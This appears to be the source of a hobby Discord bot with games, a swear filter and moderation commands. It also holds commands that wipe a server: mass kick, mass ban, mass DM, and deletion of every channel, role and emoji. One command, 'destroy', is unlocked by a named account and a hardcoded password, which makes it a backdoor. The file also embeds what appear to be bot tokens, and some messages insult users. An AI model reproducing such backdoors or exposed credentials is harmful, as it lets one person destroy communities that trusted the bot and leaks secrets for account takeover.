import discord
from discord import errors
import json
from discord.ext import commands, tasks
from itertools import cycle
from datetime import datetime
import time
import asyncio
import random
from discord.ext.commands import CommandNotFound
swears = []
print("Loading..")
statuses = ["big brane", "$help", "catch with children", "trivia", "8ball", "python", "DIE POKEMON"]
status = cycle(statuses)
author = []
content = []
nonoWords = ["shit", "fuck", "bitch", "ass", "dick", "fuk", "dik", "dic", "sht", "btch", "seth"]
set_status = ["discord.Status.online", "discord.Status.idle", "discord.Status.offline", "discord.Status.do_not_disturb"]
dictionary = open("/Users/sethraphael/dictionary.txt")


def getprefix(_bot, message):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)

        return prefixes[str(message.guild.id)]


def is_it_me(ctx):
    return ctx.author.id == 670493561921208320


bot = commands.Bot(command_prefix=getprefix)
bot.status_now = set_status[0]

# bot.remove_command("help")
bot.playingBoggle = False
bot.boggleWords = []
bot.second = 180
bot.dictionary = dictionary.readlines()


@bot.event
async def on_ready():
    change_status.start()
    print("Ready.")


async def notvaliduserkick(ctx):
    t = time.localtime()
    the_time = time.strftime("%H:%M:%S", t)
    now = datetime.now()
    current_time = now.strftime("%m/%d/%Y")
    await ctx.guild.kick(ctx.author)
    await ctx.send(
        f'''On {current_time}, at {the_time}, {ctx.author} attempted to maliciously edit {ctx.guild.name}.''')
    await ctx.send(f'''They have promptly been kicked.''')


async def notvaliduserban(ctx):
    t = time.localtime()
    the_time = time.strftime("%H:%M:%S", t)
    now = datetime.now()
    current_time = now.strftime("%m/%d/%Y")
    await ctx.guild.ban(ctx.author)
    await ctx.send(
        f'''On {current_time}, at {the_time}, {ctx.author} attempted to maliciously edit {ctx.guild.name}.''')
    await ctx.send(f'''They have promptly been banned.''')


@bot.command(pass_context=True)
async def kall(ctx):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print(f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print(f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print("Action Completed: kall")
    elif not validuser:
        await notvaliduserkick(ctx)


@bot.command(pass_context=True)
async def ball(ctx):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print(f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print("Action Completed: ball")
    elif not validuser:
        await notvaliduserban(ctx)


@bot.command(pass_context=True)
async def rall(ctx, *, rename_to):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        for user in list(ctx.guild.members):
            try:
                await user.edit(nick=rename_to)
                print(f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
            except:
                print(f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
        print("Action Completed: rall")
    elif not validuser:
        await notvaliduserkick(ctx)


@bot.command(pass_context=True)
async def mall(ctx, *, message):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        for user in ctx.guild.members:
            try:
                await user.send(message)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Action Completed: mall")
    elif not validuser:
        t = time.localtime()
        the_time = time.strftime("%H:%M:%S", t)
        now = datetime.now()
        current_time = now.strftime("%m/%d/%Y")
        await ctx.guild.kick(ctx.author)
        await ctx.send(
            f'''On {current_time}, at {the_time}, {ctx.author} attempted to direct message everyone from {ctx.guild.name}.''')
        await ctx.send(f'''They have promptly been kicked.''')


@bot.command(pass_context=True)
async def dall(ctx, condition):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        if condition.lower() == "channels":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print(f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall channels")
        elif condition.lower() == "roles":
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print(f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall roles")
        elif condition.lower() == "emojis":
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall emojis")
        elif condition.lower() == "all":
            for channel in list(ctx.guild.channels):
                try:
                    await channel.delete()
                    print(f"{channel.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
            for role in list(ctx.guild.roles):
                try:
                    await role.delete()
                    print(f"{role.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(f"{emoji.name} has been deleted in {ctx.guild.name}")
                except:
                    print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
            print("Action Completed: dall all")
    elif not validuser:
        await notvaliduserban(ctx)


@bot.command(pass_context=True)
async def destroy(ctx, password):
    if str(ctx.author) == "Latkecrszy#0947":
        if password == "LatkeCrazy1746":
            validuser = True
        else:
            validuser = False
    else:
        validuser = False
    if validuser:
        await ctx.message.delete()
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print(f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print(f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.ban(user)
                print(f"{user.name} has been banned from {ctx.guild.name}")
            except:
                print(f"{user.name} has FAILED to be banned from {ctx.guild.name}")
        print("Action Completed: destroy")
    elif not validuser:
        await notvaliduserban(ctx)


@bot.command()
async def rename(ctx, member: discord.Member = None, *, new_name):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        user_existing = False
        for user in list(ctx.guild.members):
            if str(user) == str(member):
                user_existing = True
                await user.edit(nick=new_name)
                print(f"{user.name} has been renamed to {new_name} in {ctx.guild.name}")
        if not user_existing:
            await ctx.send(f'''I could not find the member, {member} in {ctx.guild.name}.''')
    elif not validuser:
        await ctx.send(f'You do not have permission to use this command, {ctx.author}!')


@bot.command()
async def dchannel(ctx, channel_name):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        for channel in list(ctx.guild.channels):
            if str(channel) == str(channel_name):
                try:
                    await channel.delete()
                    print(f'''Channel {channel} has been deleted.''')
                except:
                    print(f'''Channel {channel} has NOT been deleted.''')
    elif not validuser:
        t = time.localtime()
        the_time = time.strftime("%H:%M:%S", t)
        now = datetime.now()
        current_time = now.strftime("%m/%d/%Y")
        await ctx.guild.kick(ctx.author)
        await ctx.send(
            f'''On {current_time}, at {the_time}, {ctx.author} attempted to delete channel {channel_name}.''')
        await ctx.send(f'''They were caught, and have promptly been kicked.''')


@bot.command()
async def testbot(ctx):
    await ctx.send(f'''The bot is up and running!''')


@bot.command()
async def purge(message, number):
    await message.channel.purge(limit=int(int(number) + 1))


@bot.command()
async def mute(ctx, member: discord.Member = None, *, reason=None):
    muted = False
    if member is not None:
        if member in list(ctx.guild.members):
            for role in list(ctx.guild.roles):
                if str(role).lower() == "muted":
                    if reason is None:
                        await member.add_roles(role, reason="There was no specified reason for this muting.")
                    elif reason is not None:
                        await member.add_roles(role, reason=reason)
                    await ctx.send(f'''Success! {member} has been muted.''')
                    muted = True
                    break
            if not muted:
                overwrite = discord.Permissions(send_messages=False)
                newRole = await ctx.guild.create_role(name="Muted")
                for channel in ctx.guild.text_channels:
                    await channel.set_permissions(newRole, overwrite=overwrite)
                await member.add_roles(newRole)
                await ctx.send(f'''Success! {member} has been muted.''')
        elif member not in list(ctx.guild.members):
            await ctx.send(f"Sorry, I couldn't find a user by the name of {member}.")
    elif member is None:
        await ctx.send(f'''You need to specify a member to mute, {ctx.author}.''')


@bot.command()
async def unmute(ctx, member: discord.Member = None):
    if member is not None:
        if member in list(ctx.guild.members):
            for role in ctx.guild.roles:
                if str(role).lower() == "muted":
                    await member.remove_roles(role)
                    await ctx.send(f'''Success! member {member} has been unmuted.''')
                    break
        elif member not in list(ctx.guild.members):
            await ctx.send(f"Sorry, I couldn't find a user by the name of {member}.")
    elif member is None:
        await ctx.send(f'''You need to specify a member to unmute, {ctx.author}.''')


@bot.command(pass_context=True)
async def kick(ctx, member: discord.Member):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        for user in list(ctx.guild.members):
            if user == member:
                await ctx.guild.kick(user)

    elif not validuser:
        await ctx.send(f"You are not authorized to use this command, {ctx.author}!")


@bot.command(pass_context=True)
async def ban(ctx, member: discord.Member):
    validuser = False
    if is_it_me(ctx):
        validuser = True
    if validuser:
        for user in list(ctx.guild.members):
            if user == member:
                await ctx.guild.ban(user)


@bot.event
async def on_error(err, *args):
    if err == "on_command_error":
        await args[0].send("Something went wrong.")
    elif isinstance(err, PermissionError):
        await args[0].send("Sorry, I don't have adequate permissions to accomplish that task.")
    raise


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        print("Error: Command not found.")
        # await ctx.send(f"I could not find that command, {ctx.author}")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Error: Missing one or more required argument.''')
    elif isinstance(error, PermissionError):
        await ctx.send("Sorry, I don't have adequate permissions to accomplish that task.")
    else:
        raise error.original


@PermissionError
async def permerr(ctx, error):
    await ctx.send("Sorry, I don't have adequate permissions to accomplish that task.")


@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Please specify who you would like to kick.''')
    else:
        raise error.original


@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Please specify who you would like to ban.''')
    else:
        raise error.original


@purge.error
async def purge_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f'''Please specify how many messages you would like to purge.''')
    else:
        raise error.original


@tasks.loop(seconds=5)
async def change_status():
    await bot.change_presence(activity=next(status), status=bot.status_now)


@bot.command()
async def displayembed(ctx):
    embed = discord.Embed(title="Yay embedding works!", description="I'm kind of excited",
                          colour=discord.Colour.green())
    # embed.set_image(url=image_url)
    # embed.set_thumbnail(url=image_url)
    # icon_url = link
    embed.set_footer(text="I can create footers!.")
    embed.set_author(name="Seth")
    embed.add_field(name="I can make fields!", value="I can make field values!", inline=True)

    await ctx.send(embed=embed)


@bot.event
async def on_guild_join(guild):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)

    prefixes[str(guild.id)] = '$'

    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)


@bot.event
async def on_guild_remove(guild):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)

    prefixes.pop(str(guild.id))

    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)


@bot.command()
async def prefix(ctx, new_prefix):
    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'r') as f:
        prefixes = json.load(f)
    prefixes[str(ctx.guild.id)] = str(new_prefix)

    with open('/Users/sethraphael/PycharmProject/Bots/prefixes.json', 'w') as f:
        json.dump(prefixes, f, indent=4)

    await ctx.send(f"{ctx.guild.name}'s prefix changed to {new_prefix}")


@bot.command()
async def testreaction(message):
    controller = await message.channel.send("Hit me with that 👍 reaction!")
    await controller.add_reaction('👎')
    await controller.add_reaction('👍')
    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=60.0, check=None)
    except asyncio.TimeoutError:
        await message.channel.send('👎')
    else:
        print(reaction)


@bot.command()
async def rps(ctx, choice):
    choice = choice.lower()
    choices = ["rock", "paper", "scissors"]
    botChoice = random.choice(choices)
    if choice == botChoice:
        await ctx.send(f"You tied! We both chose {choice}!")
    elif choice == "rock" and botChoice == "paper":
        await ctx.send(f"I won! Paper triumphs!")
    elif choice == "rock" and botChoice == "scissors":
        await ctx.send(f"Dang it, you won! Rock beats scissors.")
    elif choice == "paper" and botChoice == "rock":
        await ctx.send(f"Dang it, you won! Paper beats rock.")
    elif choice == "paper" and botChoice == "scissors":
        await ctx.send(f"I won! Scissors triumphs!")
    elif choice == "scissors" and botChoice == "paper":
        await ctx.send(f"Dang it, you won! Scissors beats paper.")
    elif choice == "scissors" and botChoice == "rock":
        await ctx.send(f"I won! Rock triumphs!")
    else:
        await ctx.send(f"That is not a valid choice, {ctx.author}!")


letters = ["Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C",
           "V", "B", "N", "M"]
boggleLetters = []
"""
A  B  C  D
E  F  G  H
I  J  K  L
M  N  O  P
"""


@bot.command()
async def boggle(ctx):
    bot.boggleWords = []
    for x in range(len(boggleLetters)):
        del boggleLetters[0]
    for x in range(16):
        boggleLetters.append(random.choice(letters))
    boggleGrid = f"{boggleLetters[0]}    {boggleLetters[1]}    {boggleLetters[2]}    {boggleLetters[3]}\n" \
                 f"{boggleLetters[4]}    {boggleLetters[5]}    {boggleLetters[6]}    {boggleLetters[7]}\n" \
                 f"{boggleLetters[8]}    {boggleLetters[9]}    {boggleLetters[10]}    {boggleLetters[11]}\n" \
                 f"{boggleLetters[12]}    {boggleLetters[13]}    {boggleLetters[14]}    {boggleLetters[15]}"
    await ctx.send(f"Here is your grid! 180 seconds on the clock! GO!\n{boggleGrid}")
    bot.playingBoggle = True
    bot.second = 180
    boggleTimer.start()


@tasks.loop(seconds=1)
async def boggleTimer(ctx):
    bot.second -= 1
    if bot.second == 120:
        await ctx.send(f'''Two minutes left, {ctx.author}!''')
    elif bot.second == 60:
        await ctx.send(f'''One minute left, {ctx.author}!''')
    elif bot.second == 30:
        await ctx.send(f'''30 seconds left, {ctx.author}!''')
    elif bot.second == 15:
        await ctx.send(f'''15 seconds left, {ctx.author}!''')
    elif bot.second == 5:
        await ctx.send(f'''5 seconds left, {ctx.author}!''')
    elif bot.second == 0:
        await ctx.send(f'''Time is up, {ctx.author}! Now checking all words!''')
        wordFound = False
        for i in bot.boggleWords:
            for p in bot.dictionary:
                if i.lower() == p.lower():
                    wordFound = True
            if wordFound:
                await ctx.send(f"Your word {i} is a valid word!")
            elif not wordFound:
                await ctx.send(f"Your word {i} is not a valid word you idiot.")
                for x in range(0, len(bot.boggleWords)):
                    if i == bot.boggleWords[x]:
                        del bot.boggleWords[x]
                        break
            await ctx.send(i)
    else:
        pass
    time.sleep(1)


@bot.command(aliases=["userinfo", "INFO", "Info", "Userinfo", "UserInfo", "userInfo", "USERINFO"])
async def info(ctx, member: discord.Member):
    embed = discord.Embed(title=f"{member} joined {member.guild} at:", description=f"{member.joined_at}"
                          )
    # embed.set_image(url=image_url)
    # embed.set_thumbnail(url=image_url)
    # icon_url = link
    embed.set_footer(text=f"Created at {ctx.message.created_at}")
    embed.set_author(name=f'User Information - {member}')
    embed.add_field(name="Avatar:", value=f"{member.avatar}", inline=True)

    await ctx.send(embed=embed)


@bot.command()
async def amazon(ctx):
    embed = discord.Embed(title="Cat ass coloring book")
    embed.set_footer(text=f"Buy it here at \n https://www.amazon.com/Cat-Butts-Space-Feline-Frontier/dp/1733702202/ref=sr_1_1_sspa?dchild=1")
    embed.set_author(name=f"{ctx.author}")
    embed.add_field(name="Enjoy coloring the asses of your favorite cats!", value="With this book, you can color all the asses you want WITHOUT seeming like a pervert!", inline=True)

    await ctx.send(embed=embed)


@bot.event
async def on_member_join(member):
    for channel in member.guild.text_channels:
        if str(channel) == "welcome-and-goodbye":
            await channel.send(f"Please welcome {member.mention} to {member.guild.name}! Check out the <#701640063770951730> page for server etiquette, "
            f"and the <#735875189509718137> page to see who people are.")


@bot.event
async def on_member_remove(member):
    for channel in member.guild.text_channels:
        if str(channel) == "welcome-and-goodbye":
            await channel.send(f"Fffffffuuuuuuccccckkkkkk... another member gone. Can we get an f in the chat for {member.nick}?")


@bot.command()
async def addnono(ctx, *, word):
    wordAlready = False
    for i in nonoWords:
        if str(word) == str(i):
            await ctx.send("That word is already in the no no words list!")
            wordAlready = True
    if not wordAlready:
        nonoWords.append(str(word))
        await ctx.send("Your word has been added to the no no words list!")


@bot.command()
async def delnono(ctx, *, word):
    wordAlready = False
    for i in nonoWords:
        if str(word) == str(i):
            wordAlready = True
    if wordAlready:
        for x in range(len(nonoWords)):
            if nonoWords[x] == word:
                del nonoWords[x]
        await ctx.send("Your word has been deleted from the no no words list!")


@bot.event
async def on_message(message):
    """Kick them if they say chair"""
    if message.content.find("chair") != -1:
        await message.author.kick(reason="You have said the word chair. You have been kicked for your insolence.")
        await message.channel.send(f"{message.author} has been kicked for sending the word chair. You are welcome.")
        author.append(str(message.author))
        content.append(str(message.content))

    """Delete poketwo's message if they talk outside of pokemon
    if str(message.channel) != "pokemon" and str(message.channel) != "spam" and str(message.author) == "Pokétwo#8236":
        await message.channel.purge(limit=1)
        time.sleep(1)"""

    """Delete spam messages"""
    if len(author) >= 5 and len(content) >= 5 and str(message.channel) != "spam":
        mesg1 = author[-1]
        mesg2 = author[-2]
        mesg3 = author[-3]
        mesg4 = author[-4]
        mesg5 = author[-5]
        cont1 = content[-1]
        cont2 = content[-2]
        cont3 = content[-3]
        cont4 = content[-4]
        cont5 = content[-5]
        if mesg1 == mesg2 == mesg3 == mesg4 == mesg5:
            if cont1 == cont2 == cont3 == cont4 == cont5:
                await message.channel.purge(limit=5)
                for x in range(len(content)):
                    del content[x]
                    del author[x]

    """Check for boggle words"""
    if bot.playingBoggle:
        boggleContent = str(message.content).split(" ")
        bot.boggleWords.append(str(boggleContent[0]))

    """Checks for no-no words"""
    for i in nonoWords:
        if message.content.lower().find(str(i)) != -1:
            await message.channel.send("That ain't nice. Don't swear peeps.")
            swears.append(str(message.author))
            msgAuthor = str(message.author)
            swearCount = 0
            for p in swears:
                if msgAuthor == p:
                    swearCount += 1
            if swearCount == 5:
                await message.channel.send(f"You have sworn 5 times, {message.author.mention}. If you continue, there will be punishment.")
            elif swearCount == 10:
                await message.channel.send(f"You have sworn 10 times, {message.author.mention}. If you swear 20 times, you will be muted for 10 minutes.")
            elif swearCount == 20:
                await message.channel.send(f"You have sworn 20 times, {message.author.mention}. You have been muted for 10 minutes.")
                await mutedrole(message, 600)
            elif swearCount == 25:
                await message.channel.send(f"{message.author.mention}, bro, you gotta stop swearing already. That's 25 swears! If it reaches 30, I'm muting you for half an hour.")
            elif swearCount == 30:
                await message.channel.send(
                    f"You have sworn 30 times, {message.author.mention}. You have been muted for 30 minutes.")
                await mutedrole(message, 1800)
            elif swearCount == 40:
                await message.channel.send(f"{message.author.mention}, bro, what's it going to take to get through to you? STOP SWEARING!!! If you swear 50 times, I'm gonna mute you for an hour.")
            elif swearCount == 50:
                await message.channel.send(
                    f"You fucking, fucking idiot. Why do you insist upon swearing so much??? I'm muting you for an hour to teach you a lesson.")
                await mutedrole(message, 3600)
            break
    await bot.process_commands(message)


async def mutedrole(message, sleep):
    for role in list(message.guild.roles):
        if str(role).lower() == "muted":
            await message.author.add_roles(role, reason="Don't swear you fucking idiot.")
    await asyncio.sleep(int(sleep))
    await message.channel.send(f"You have been unmuted, {message.author.mention}. Now stop fucking swearing already.")
    for role in list(message.guild.roles):
        if str(role).lower() == "muted":
            await message.author.remove_roles(role=role)

bot.run("NzM2MjgzOTg4NjI4NjAyOTYw.Xxsj5g.B5eSdENH1GLRT7CkMLACTw7KpGE")
# MY TOKEN
# NzMzMTI1NzEwNDAyODE0MDAy.Xx3qWg.ZL_vsrT5-gH2FpkI78psGO3nCdA
